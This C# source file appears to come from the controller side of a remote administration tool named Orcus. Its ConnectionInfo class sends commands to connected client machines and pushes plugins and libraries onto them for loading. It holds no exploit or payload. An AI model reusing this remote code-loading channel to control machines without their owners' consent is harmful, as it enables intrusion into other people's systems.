using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using Orcus.Administration.Core.Args;
using Orcus.Administration.Core.Logging;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Command = Orcus.Administration.Plugins.CommandViewPlugin.Command;
using IConnectionInfo = Orcus.Administration.Plugins.CommandViewPlugin.IConnectionInfo;
using PackageCompression = Orcus.Administration.Plugins.CommandViewPlugin.PackageCompression;

namespace Orcus.Administration.Core.CommandManagement
{
    public class ConnectionInfo : IConnectionInfo
    {
        private readonly ConnectionManager _connectionManager;
        private readonly Commander _commander;
        private PortableLibrary _loadedLibraries;
        private const string LibrariesPath = "libraries";

        public ConnectionInfo(OnlineClientInformation clientInformation, Sender sender,
            ConnectionManager connectionManager, Commander commander)
        {
            _connectionManager = connectionManager;
            _commander = commander;
            Sender = sender;
            ClientInformation = clientInformation;
        }

        public ISender Sender { get; }
        public OnlineClientInformation ClientInformation { get; }

        public async Task SendCommand(Command command, byte[] data,
            PackageCompression packageCompression = PackageCompression.Auto)
        {
            if (command.Identifier > 1000)
            {
                if (!await PreparePlugin(command.Identifier))
                    return;
            }

            var commandSettings = _commander.GetCommandSettings(command);

            if (commandSettings.Libraries.Count > 0)
            {
                PortableLibrary libraries = commandSettings.Libraries[0];
                for (int i = 1; i < commandSettings.Libraries.Count; i++)
                {
                    libraries |= commandSettings.Libraries[i];
                }

                if (!await LoadLibraries(libraries))
                    return;
            }

            Sender.UnsafeSendCommand(ClientInformation.Id, command.Identifier, new WriterCall(data));

            PackageSent?.Invoke(this, new PackageInformation
            {
                IsReceived = false,
                Size = data.Length + 9,
                Timestamp = DateTime.Now,
                Description = "SendCommand " + Commander.GetCommandDescription(command, data, false)
            });
        }

        public Task SendCommand(Command command, byte data)
        {
            return SendCommand(command, new[] {data}, PackageCompression.DoNotCompress);
        }

        public Task SendCommand(Command command, IDataInfo dataInfo)
        {
            return UnsafeSendCommand(command, new WriterCall(dataInfo));
        }

        public async Task UnsafeSendCommand(Command command, WriterCall writerCall)
        {
            if (command.Identifier > 1000)
            {
                if (!await PreparePlugin(command.Identifier))
                    return;
            }

            Sender.UnsafeSendCommand(ClientInformation.Id, command.Identifier, writerCall);

            PackageSent?.Invoke(this, new PackageInformation
            {
                Description = $"UnsafeSendCommand ({command} / ID: {command.Identifier})",
                IsReceived = false,
                Size = writerCall.Size,
                Timestamp = DateTime.Now
            });
        }

        public Task UnsafeSendCommand(Command command, int length, Action<BinaryWriter> writerCall)
        {
            return UnsafeSendCommand(command, new WriterCall(length, writerCall));
        }

        public event EventHandler<PackageInformation> PackageSent;

        private async Task<bool> PreparePlugin(uint id)
        {
            var pluginResult =
                PluginManager.Current.LoadedPlugins
                    .OfType<ICommandPlugin>().FirstOrDefault(x => x.CommandId == id);

            if (pluginResult == null)
            {
                Logger.Fatal($"Plugin which contains a command with id {id} wasn't found");
                return false;
            }

            var plugin = pluginResult as CommandAndViewPlugin;
            if (plugin == null)
                return true;

            if (
                ClientInformation.Plugins.Any(
                    x => x.Guid == plugin.PluginInfo.Guid && x.Version == plugin.PluginInfo.Version.ToString()))
                return true;

            if (ClientInformation.LoadablePlugins != null &&
                ClientInformation.LoadablePlugins.Any(
                    x => x.Guid == plugin.PluginInfo.Guid && x.Version == plugin.PluginInfo.Version.ToString()))
            {
                var sendingService = (Sender) Sender;
                var pluginInfoData = new Serializer(typeof (PluginVersion)).Serialize(plugin.PluginInfo.Version);

                lock (sendingService.WriterLock)
                {
                    sendingService.Connection.BinaryWriter.Write((byte) FromAdministrationPackage.LoadPlugin);
                    sendingService.Connection.BinaryWriter.Write(4 + 16 + pluginInfoData.Length);
                    sendingService.Connection.BinaryWriter.Write(BitConverter.GetBytes(ClientInformation.Id));
                    sendingService.Connection.BinaryWriter.Write(plugin.PluginInfo.Guid.ToByteArray());
                    sendingService.Connection.BinaryWriter.Write(pluginInfoData);
                }

                PackageSent?.Invoke(this, new PackageInformation
                {
                    Description = "ConnectionInfo LoadPlugin",
                    IsReceived = false,
                    Size = 4 + 16 + pluginInfoData.Length + 5,
                    Timestamp = DateTime.Now
                });

                var autoResetEvent = new AutoResetEvent(false);
                var successful = false;

                EventHandler<PluginLoadedEventArgs> pluginLoadedHandler = (sender, args) =>
                {
                    if (args.ClientId == ClientInformation.Id && args.Guid == plugin.PluginInfo.Guid &&
                        args.Version == plugin.PluginInfo.Version.ToString())
                    {
                        successful = true;
                        // ReSharper disable once AccessToDisposedClosure
                        autoResetEvent.Set();
                    }
                };

                EventHandler<PluginLoadedEventArgs> pluginLoadingFailedHandler = (sender, args) =>
                {
                    if (args.ClientId == ClientInformation.Id && args.Guid == plugin.PluginInfo.Guid &&
                        args.Version == plugin.PluginInfo.Version.ToString())
                    {
                        // ReSharper disable once AccessToDisposedClosure
                        autoResetEvent.Set();
                    }
                };

                _connectionManager.PluginLoaded += pluginLoadedHandler;
                _connectionManager.PluginLoadingFailed += pluginLoadingFailedHandler;

                try
                {
                    // ReSharper disable once AccessToDisposedClosure
                    if (await Task.Run(() => autoResetEvent.WaitOne(20000)) && successful)
                        return true;
                }
                finally
                {
                    _connectionManager.PluginLoaded -= pluginLoadedHandler;
                    _connectionManager.PluginLoadingFailed -= pluginLoadingFailedHandler;
                    autoResetEvent.Dispose();
                }
            }

            var autoResetEvent2 = new AutoResetEvent(false);
            var successful2 = false;

            EventHandler<PluginLoadedEventArgs> pluginLoadedHandler2 = (sender, args) =>
            {
                if (args.ClientId == ClientInformation.Id && args.Guid == plugin.PluginInfo.Guid &&
                    args.Version == plugin.PluginInfo.Version.ToString())
                {
                    successful2 = true;
                    // ReSharper disable once AccessToDisposedClosure
                    autoResetEvent2.Set();
                }
            };

            EventHandler<PluginLoadedEventArgs> pluginLoadingFailedHandler2 = (sender, args) =>
            {
                if (args.ClientId == ClientInformation.Id && args.Guid == plugin.PluginInfo.Guid &&
                    args.Version == plugin.PluginInfo.Version.ToString())
                {
                    // ReSharper disable once AccessToDisposedClosure
                    autoResetEvent2.Set();
                }
            };

            _connectionManager.PluginLoaded += pluginLoadedHandler2;
            _connectionManager.PluginLoadingFailed += pluginLoadingFailedHandler2;

            try
            {
                await _connectionManager.SendPlugin(plugin, ClientInformation.Id);
                // ReSharper disable once AccessToDisposedClosure
                if (await Task.Run(() => autoResetEvent2.WaitOne(20000)) && successful2)
                    return true;
            }
            finally
            {
                _connectionManager.PluginLoaded -= pluginLoadedHandler2;
                _connectionManager.PluginLoadingFailed -= pluginLoadingFailedHandler2;
                autoResetEvent2.Dispose();
            }

            return false;
        }

        private static string GetFilenameByLibrary(PortableLibrary library)
        {
            return library.GetAttributeOfType<PortableLibraryNameAttribute>()?.Name;
        }

        private async Task<bool> LoadLibraries(PortableLibrary libraries)
        {
            libraries = libraries & ~_loadedLibraries;

            var sendingService = (Sender) Sender;
            var libraryInfos =
                EnumUtilities.GetUniqueFlags<PortableLibrary>(libraries)
                    .Where(x => x != 0)
                    .Select(x =>
                    {
                        var filename = GetFilenameByLibrary(x);
                        return new LocalLibraryInfo(x)
                        {
                            Path = File.Exists(filename) ? filename : Path.Combine(LibrariesPath, filename)
                        };
                    }).ToList();

            if (libraryInfos.Count == 0)
                return true;

            using (var md5 = new MD5CryptoServiceProvider())
                foreach (var libraryInfo in libraryInfos)
                {
                    using (
                        var fileStream = new FileStream(libraryInfo.Path, FileMode.Open,
                            FileAccess.Read)
                        )
                        libraryInfo.Hash = md5.ComputeHash(fileStream);
                }

            using (var autoResetEvent = new AutoResetEvent(false))
            {
                var neededLibraries = PortableLibrary.None;
                EventHandler<LibraryInformationEventArgs> libraryInformationReceiedHandler = (sender, args) =>
                {
                    if (args.ClientId == ClientInformation.Id)
                    {
                        neededLibraries = args.Libraries;
                        autoResetEvent.Set();
                    }
                };

                _connectionManager.LibraryInformationReceived += libraryInformationReceiedHandler;

                sendingService.OpenClientRedirect(ClientInformation.Id, ClientRedirectOptions.IncludeAdministrationId,
                    FromAdministrationPackage.RequestLibraryInformation, 4 + 16 * libraryInfos.Count,
                    writer =>
                    {
                        writer.Write(BitConverter.GetBytes((int) libraries));
                        foreach (var libraryHash in libraryInfos)
                            writer.Write(libraryHash.Hash);
                    });

                PackageSent?.Invoke(this, new PackageInformation
                {
                    Description = $"ConnectionInfo CheckLibraries ({libraries})",
                    IsReceived = false,
                    Size = 4 + 16 * libraryInfos.Count + 14,
                    Timestamp = DateTime.Now
                });

                try
                {
                    if (!await Task.Run(() => autoResetEvent.WaitOne(20000)))
                        return false;
                }
                finally
                {
                    _connectionManager.LibraryInformationReceived -= libraryInformationReceiedHandler;
                }

                if (neededLibraries == PortableLibrary.None)
                {
                    _loadedLibraries |= neededLibraries;
                    return true;
                }

                autoResetEvent.Reset();

                var librariesToSend = libraryInfos.Where(x => (neededLibraries & x.Library) == x.Library).ToList();
                await _connectionManager.SendLibraries(librariesToSend, ClientInformation.Id);

                var loadedLibraries = PortableLibrary.None;
                EventHandler<LibraryInformationEventArgs> libraryLoadingResultHandler = (sender, args) =>
                {
                    if (args.ClientId == ClientInformation.Id)
                    {
                        loadedLibraries = args.Libraries;
                        autoResetEvent.Set();
                    }
                };

                _connectionManager.LibraryLoadingResultReceived += libraryLoadingResultHandler;
                try
                {
                    if (!await Task.Run(() => autoResetEvent.WaitOne(20000)))
                        return false;
                }
                finally
                {
                    _connectionManager.LibraryLoadingResultReceived -= libraryLoadingResultHandler;
                }

                _loadedLibraries |= loadedLibraries;
                return loadedLibraries == neededLibraries;
            }
        }
    }
}